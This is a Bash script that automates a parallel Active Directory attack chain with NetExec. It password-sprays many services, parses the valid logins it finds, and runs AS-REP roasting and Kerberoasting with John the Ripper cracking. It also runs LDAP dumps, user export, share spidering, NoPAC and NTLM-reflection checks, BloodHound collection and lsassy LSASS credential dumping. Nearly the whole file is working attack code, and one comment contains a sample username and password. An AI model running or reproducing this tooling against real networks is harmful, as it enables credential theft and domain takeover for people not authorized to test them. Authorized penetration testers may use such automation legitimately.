#!/bin/bash

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
GRAY='\033[1;30m'
NC='\033[0m'

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_auth_spray.txt"
CLEAN_OUT="$OUTDIR/final_auth_success.txt"
SPIDER_DIR="$OUTDIR/spider_plus"
BROKEN_PIPE_LOG="$OUTDIR/broken_pipe_hosts.txt"
USER_EXPORT_OUT="$OUTDIR/final_auth_user.txt"  
DC_INFO="$OUTDIR/dc_domain_mapping.txt"
FINAL_CRACKED="$OUTDIR/final_cracked_asrep_kerberoast.txt"
FINAL_OUT="$OUTDIR/final_summary.txt"

mkdir -p "$OUTDIR" "$SPIDER_DIR"
: > "$BROKEN_PIPE_LOG"
: > "$CLEAN_OUT"
: > "$RAW_OUT"
: > "$FINAL_CRACKED"
: > "$USER_EXPORT_OUT"

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] Spray Engine Auth Paralel${NC}"
echo -e "${PURPLE}====================================================${NC}"

for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [[ ! -f "$f" ]] && echo -e "${RED}[!] Error: File '$f' does not exist!${NC}" && exit 1
done

declare -A DC_MAP
declare -A ASREP_DONE
declare -A KERB_DONE
declare -A BH_DONE
declare -A DC_FQDN_MAP
declare -A USER_EXP_DONE

if [[ -s "$DC_INFO" ]]; then
    while IFS=';' read -r dc_ip dc_domain dc_fqdn || [[ -n "$dc_ip" ]]; do
        [[ -z "$dc_ip" || "$dc_ip" =~ ^# ]] && continue
        dc_ip="${dc_ip//[[:space:]]/}"
        dc_domain="${dc_domain//[[:space:]]/}"
        dc_fqdn="${dc_fqdn//[[:space:]]/}"
        DC_MAP["$dc_domain"]="$dc_ip"
        DC_FQDN_MAP["$dc_domain"]="${fqdn:-DC01.$dc_domain}"
    done < "$DC_INFO"
fi

PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")

declare -A PROTO_MAP
for proto in "${PROTOCOLS[@]}"; do
    FILE_PROTO="$OUTDIR/active_$proto.txt"
    [[ ! -s "$FILE_PROTO" ]] && continue
    while read -r ip; do
        [[ -z "$ip" ]] && continue
        PROTO_MAP["$ip"]+="$proto "
    done < "$FILE_PROTO"
done

declare -A DOMAIN_CACHE
get_domain() {
    local ip="$1"
    [[ -n "${DOMAIN_CACHE[$ip]}" ]] && { echo "${DOMAIN_CACHE[$ip]}"; return; }
    for d_key in "${!DC_MAP[@]}"; do
        if [[ "${DC_MAP[$d_key]}" == "$ip" ]]; then
            DOMAIN_CACHE[$ip]="$d_key"
            echo "$d_key"
            return
        fi
    done

    local domain="" hostname="" nxc_out
    echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress${NC}"
    nxc_out=$(timeout 15s nxc smb "$ip" --no-progress 2>/dev/null)
    domain=$(echo "$nxc_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
    hostname=$(echo "$nxc_out" | grep -oP '(?<=\(name:)[^)]+' | head -n1)

    if [[ -z "$domain" || "$domain" == "WORKGROUP" ]]; then
        domain="."
    else
        if [[ -z "${DC_MAP[$domain]}" ]]; then
            DC_MAP["$domain"]="$ip"
            DC_FQDN_MAP["$domain"]="${hostname:-DC01}.${domain}"
        fi
    fi
    DOMAIN_CACHE[$ip]="$domain"
    echo "$domain"
}

# =================================================================
# WRAPPER FUNGSI UNTUK PROSES PARALEL (FLOW TETAP SAMA PERSIS)
# =================================================================
process_target_proto() {
    local ip="$1"
    local proto="$2"
    local DOMAIN
    DOMAIN=$(get_domain "$ip")

    # File temporary unik per thread/job
    local TMP_RES=".tmp_res_${ip}_${proto}_$$"
    local TMP_SUCCESS=".tmp_success_${ip}_${proto}_$$"
    
    : > "$TMP_RES"
    : > "$TMP_SUCCESS"

    # -----------------------------------------------------------------
    # STEP 1 & 2: AUTH SPRAY (Logika tetap sama, output ditampung dulu)
    # -----------------------------------------------------------------
    local DOMAIN_ARG=""
    local EXTRA=""
    [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] && EXTRA="--local-auth"

    local attempt_spray=1
    local max_spray=2
    
    while [ $attempt_spray -le $max_spray ]; do
        echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" $EXTRA --continue-on-success --no-progress${NC}"
        timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" $EXTRA --continue-on-success --no-progress > "$TMP_RES" 2>&1
        sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
        cat "$TMP_RES" >> "$RAW_OUT"
        grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"

        if [[ -s "$TMP_SUCCESS" ]]; then
            break
        fi
        if [[ ! -s "$TMP_RES" ]]; then
            ((attempt_spray++)); sleep 3
        elif grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
            ((attempt_spray++)); sleep 3
        elif grep -qiE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT|Access denied|\[-\]" "$TMP_RES"; then
            break
        else
            break
        fi
    done

    if [[ ! -s "$TMP_SUCCESS" && "$DOMAIN" != "." && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
        local attempt_dom=1
        EXTRA="" 
        while [ $attempt_dom -le $max_spray ]; do
            echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" -d \"$DOMAIN\" --continue-on-success --no-progress${NC}"
            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress > "$TMP_RES" 2>&1
            sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" 
            cat "$TMP_RES" >> "$RAW_OUT"
            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
            
            if [[ -s "$TMP_SUCCESS" ]]; then
                DOMAIN_ARG="-d $DOMAIN"
                break
            fi
            if [[ ! -s "$TMP_RES" ]]; then
                ((attempt_dom++)); sleep 3
            elif grep -qiE "Broken Pipe|timed out|connection.*timeout" "$TMP_RES"; then
                ((attempt_dom++)); sleep 3
            elif grep -qiE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT|Access denied|\[-\]" "$TMP_RES"; then
                break
            else
                break
            fi
        done
    fi

    # -----------------------------------------------------------------
    # STEP 3: DYNAMIC MULTI-CREDENTIAL PARSING & POST-EXPLOIT
    # -----------------------------------------------------------------
    if [[ -s "$TMP_SUCCESS" ]]; then
        # Cetak header host secara rapi saat kredensial dipastikan valid
        echo -e "\n${CYAN}>>> Target Host: $ip (${proto^^}) - Credentials Found!${NC}"
        cat "$TMP_RES" # Tampilkan output nxc asli ke layar secara utuh

        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            RAW_CRED=$(echo "$line" | sed -n 's/.*\[+\] \([^ ]*\).*/\1/p')
            u_p="${RAW_CRED#*\\}"      
            u="${u_p%%:*}"
            p="${u_p#"$u":}"        

            if [[ -n "$u" && -n "$p" ]]; then
                echo "[$proto] $ip - [+] Valid Credentials Found -> $u:$p" >> "$CLEAN_OUT"
                if echo "$line" | grep -qi "Pwn3d!"; then
                    echo "[$proto] $ip - [!!!] Pwn3d! Status Achieved for $u" >> "$CLEAN_OUT"
                fi
            fi
        done < "$TMP_SUCCESS"

        BEST_LINE=$(grep -i "Pwn3d!" "$TMP_SUCCESS" | head -n1)
        [[ -z "$BEST_LINE" ]] && BEST_LINE=$(head -n1 "$TMP_SUCCESS")
        
        RAW_CRED=$(echo "$BEST_LINE" | sed -n 's/.*\[+\] \([^ ]*\).*/\1/p')
        user_pass="${RAW_CRED#*\\}"
        user="${user_pass%%:*}"
        pass="${user_pass#*:}"
        
        dc_ip="${DC_MAP[$DOMAIN]}"

        # --- ROASTING ENGINE (MENGGUNAKAN FILE-BASED LOCK INDIKATOR) ---
        if [[ -n "$dc_ip" && "$DOMAIN" != "." ]]; then
            
            # Gunakan utilitas mkdir untuk membuat lock directory atomik (Aman dari Race Condition)
            if mkdir "$OUTDIR/lock_asrep_${DOMAIN}" 2>/dev/null; then
                ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
                echo -e "${PURPLE}[EXEC] Running ASREP Roasting → $DOMAIN ($dc_ip)${NC}"
                echo -e "${GRAY}[CMD] timeout 40s impacket-GetNPUsers \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -format hashcat -outputfile \"$ASREP_HASH_FILE\"${NC}"
                timeout 40s impacket-GetNPUsers "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -format hashcat -outputfile "$ASREP_HASH_FILE" 2>&1 | tee "$OUTDIR/asrep_${DOMAIN}_raw.log"
                
                if [[ -s "$ASREP_HASH_FILE" ]]; then
                    echo -e "${RED}[!] ASREP hash found! Cracking with John...${NC}"
                    echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$ASREP_HASH_FILE\"${NC}"
                    timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$ASREP_HASH_FILE" 
                    ASREP_RESULT=$(john --show "$ASREP_HASH_FILE" | grep -v "password cracked" | grep ":")
                    if [[ -n "$ASREP_RESULT" ]]; then
                        echo -e "${GREEN}[+++] SUCCESS! Cracked ASREP Hash(es):\n${YELLOW}$ASREP_RESULT${NC}"
                        echo -e "\n[ASREP - $DOMAIN]\n$ASREP_RESULT" >> "$FINAL_CRACKED"
                    fi
                fi
            fi

            if mkdir "$OUTDIR/lock_kerb_${DOMAIN}" 2>/dev/null; then
                KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
                echo -e "${PURPLE}[EXEC] Running Kerberoasting → $DOMAIN ($dc_ip)${NC}"
                echo -e "${GRAY}[CMD] timeout 40s impacket-GetUserSPNs \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -outputfile \"$KERB_HASH_FILE\"${NC}"
                timeout 40s impacket-GetUserSPNs "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -outputfile "$KERB_HASH_FILE" 2>&1 | tee "$OUTDIR/kerberoast_${DOMAIN}_raw.log"
                
                if [[ -s "$KERB_HASH_FILE" ]]; then
                    echo -e "${RED}[!] Kerberoast hash found! Cracking with John...${NC}"
                    echo -e "${GRAY}[CMD] timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules \"$KERB_HASH_FILE\"${NC}"
                    timeout 180s john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --rules "$KERB_HASH_FILE" 
                    KERB_RESULT=$(john --show "$KERB_HASH_FILE" | grep -v "password cracked" | grep ":")
                    if [[ -n "$KERB_RESULT" ]]; then
                        echo -e "${GREEN}[+++] SUCCESS! Cracked Kerberoast Hash(es):\n${YELLOW}$KERB_RESULT${NC}"
                        echo -e "\n[KERBEROAST - $DOMAIN]\n$KERB_RESULT" >> "$FINAL_CRACKED"
                    fi
                fi
            fi
        fi

        # --- LDAP POST-EXPLOIT ---
        if [[ "$proto" == "ldap" ]]; then
            DUMP_PATH="$OUTDIR/ldap_$ip"
            mkdir -p "$DUMP_PATH"
            LDAP_USER="$user"

            if [[ "$DOMAIN" != "." ]]; then
                LDAP_USER=$(printf '%s\\%s' "$DOMAIN" "$user")
            fi
            echo "[DEBUG] RAW DOMAIN: $DOMAIN"
            echo "[DEBUG] RAW USER: $user"
            echo "[DEBUG] FINAL LDAP_USER: $LDAP_USER"
            echo -e "${YELLOW}[!] Executing ldapdomaindump...${NC}"
            echo "[CMD] timeout 60s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\""
            timeout 60s ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" 

            if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
                echo -e "${YELLOW}[!] Exporting users via LDAP for domain $DOMAIN...${NC}"
                echo -e "${GRAY}[CMD] timeout 40s nxc ldap \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                timeout 40s nxc ldap "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
                if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                    cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                    rm -f "$USER_EXPORT_OUT.tmp"
                    echo -e "${GREEN}[+] Successfully exported users via LDAP for $DOMAIN.${NC}"
                fi
            fi
        fi

        # --- SMB POST-EXPLOIT ---
        if [[ "$proto" == "smb" ]]; then
            if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
                echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
                echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
                timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
                if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                    cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                    rm -f "$USER_EXPORT_OUT.tmp"
                    echo -e "${GREEN}[+] Successfully exported users via SMB for $DOMAIN.${NC}"
                fi
            fi

            ABS_SPIDER=$(readlink -f "$SPIDER_DIR")
            echo -e "${GRAY}[CMD] timeout 60s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M spider_plus ...${NC}"
            timeout 60s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" >/dev/null 2>&1
            
            echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M nopac${NC}"
            timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac > "$TMP_RES" 2>&1
            grep -qi "VULNERABLE" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NoPAC!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NoPAC!" >> "$CLEAN_OUT"; }

            echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M ntlm_reflection${NC}"
            timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection > "$TMP_RES" 2>&1
            grep -qi "vulnerable" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NTLM Reflection!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NTLM Reflection!" >> "$CLEAN_OUT"; }

            if [[ -z "${BH_DONE[$DOMAIN]}" && "$DOMAIN" != "." ]]; then
                if mkdir "$OUTDIR/lock_bh_${DOMAIN}" 2>/dev/null; then
                    BH_DIR="$OUTDIR/bloodhound_${ip}"
                    mkdir -p "$BH_DIR"
                    echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
                    (
                        cd "$BH_DIR" || exit
                        echo -e "${GRAY}[CMD] timeout 150s bloodhound-python -d \"$DOMAIN\" -dc \"${DC_FQDN_MAP[$DOMAIN]}\" -u \"$user\" -p \"$pass\" -ns \"$dc_ip\" -c all${NC}"
                        timeout 150s bloodhound-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$dc_ip" -c all >bloodhound_run.log 2>&1
                    )
                fi
            fi

            if echo "$BEST_LINE" | grep -qi "Pwn3d!"; then
                echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $EXTRA $DOMAIN_ARG -M lsassy${NC}"
                timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $EXTRA $DOMAIN_ARG -M lsassy > "$TMP_RES" 2>&1
                if grep -qiE "dumped|success" "$TMP_RES"; then
                    echo "[$proto] $ip - [LSASS] Credentials successfully dumped via lsassy" >> "$CLEAN_OUT"
                fi
            fi
        fi
    fi
    
    rm -f "$TMP_RES" "$TMP_SUCCESS"
}
# =================================================================
# MAIN CONTROL PARALLEL LOOP
# =================================================================
MAX_PARALLEL_JOBS=5  # Jumlah maksimal target host/protokol yang running berbarengan
current_jobs=0

for ip in "${!PROTO_MAP[@]}"; do
    for proto in ${PROTO_MAP[$ip]}; do
        
        # Eksekusi fungsi utama secara asinkronus (Background Job)
        process_target_proto "$ip" "$proto" &
        
        ((current_jobs++))
        
        # Manajemen throttling job agar tidak mengacaukan resource OS/Network
        if [ "$current_jobs" -ge "$MAX_PARALLEL_JOBS" ]; then
            wait -n  # Menunggu salah satu job background selesai (Fitur Bash v4.3+)
            ((current_jobs--))
        fi
    done
done

# Menunggu seluruh sisa background jobs selesai secara total
wait

# =================================================================
# CLEANUP & USER DUMP SORTING
# =================================================================
if [[ -s "$USER_EXPORT_OUT" ]]; then
    # Menghapus spasi kosong yang tidak sengaja terbawa (opsional tapi aman)
    sed -i '/^[[:space:]]*$/d' "$USER_EXPORT_OUT"
    
    # Melakukan sorting, mengambil nilai unik (sort -u), dan menimpa file aslinya
    sort -u "$USER_EXPORT_OUT" -o "$USER_EXPORT_OUT"
    
    # Menghitung jumlah user unik yang berhasil didapatkan
    TOTAL_USERS=$(wc -l < "$USER_EXPORT_OUT")
    
    echo -e "${GREEN}[+] Consolidated $TOTAL_USERS unique users from SMB/LDAP into:${NC}"
    echo -e "${YELLOW}---> $USER_EXPORT_OUT${NC}\n"
else
    echo -e "\n${YELLOW}[!] No users were exported from any domain targets.${NC}\n"
fi

# =================================================================
# PHASE 4: FINAL CHRONOLOGICAL SUMMARY
# =================================================================
echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 4: FINAL CHRONOLOGICAL SUMMARY${NC}"
echo -e "${PURPLE}====================================================${NC}"

: > "$FINAL_OUT"

if [[ -s "$RAW_OUT" ]]; then
    grep -aEi "\[\*\]|LSASSY|VULN|TGT with|PetitPotam|DFSCoerce" "$RAW_OUT" | awk '!seen[$0]++' >> "$FINAL_OUT"
fi

if [[ -s "$CLEAN_OUT" ]]; then
    cat "$CLEAN_OUT" >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_CRACKED" ]]; then
    echo -e "\n--- CRACKED CREDENTIALS (JOHN THE RIPPER) ---" >> "$FINAL_OUT"
    cat "$FINAL_CRACKED" >> "$FINAL_OUT"
fi

if [[ -s "$FINAL_OUT" ]]; then
    while IFS= read -r line; do
        if [[ "$line" == *"[+]"* || "$line" == *"Valid Credentials"* ]]; then
            echo -e "${GREEN}${line}${NC}"
        elif [[ "$line" == *"[!!!]"* || "$line" == *"[LSASS]"* ]]; then
            echo -e "${RED}${line}${NC}"
        elif [[ "$line" == *"[*]"* ]]; then
            echo -e "${BLUE}${line}${NC}"
        else
            echo -e "${YELLOW}${line}${NC}"
        fi
    done < "$FINAL_OUT"
else
    echo -e "${YELLOW}[!] No summary records found.${NC}"
fi

# =================================================================
# EXTRACTION: UNIQUE VALID CREDENTIALS TO Final_valid_creds.txt
# =================================================================
FINAL_CREDS_FILE="$OUTDIR/Final_valid_creds.txt"
: > "$FINAL_CREDS_FILE"

if [[ -s "$FINAL_OUT" ]]; then
    # Mengambil baris yang memiliki pola kredensial valid
    # Contoh input: [winrm] 10.0.16.179 - [+] Valid Credentials Found -> ATHENA_SVC:1dirtymartini
    # Hasil output: 10.0.16.179;ATHENA_SVC:1dirtymartini
    grep -a "Valid Credentials Found" "$FINAL_OUT" | awk -F'-> ' '{print $1, $2}' | awk '{print $2 ";" $NF}' | sort -u > "$FINAL_CREDS_FILE"

    if [[ -s "$FINAL_CREDS_FILE" ]]; then
        TOTAL_CREDS=$(wc -l < "$FINAL_CREDS_FILE")
        echo -e "\n${GREEN}[+] Successfully extracted $TOTAL_CREDS unique credentials into:${NC}"
        echo -e "${YELLOW}---> $FINAL_CREDS_FILE${NC}"
        echo -e "${GRAY}------------------------------------------------------------${NC}"
        cat "$FINAL_CREDS_FILE"
        echo -e "${GRAY}------------------------------------------------------------${NC}"
    fi
fi

if [[ -s "$BROKEN_PIPE_LOG" ]]; then
    echo -e "\n${RED}[!] HOSTS WITH CONNECTION TIMEOUTS / BROKEN PIPE:${NC}"
    echo -e "${GRAY}------------------------------------------------------------${NC}"
    cat "$BROKEN_PIPE_LOG"
fi
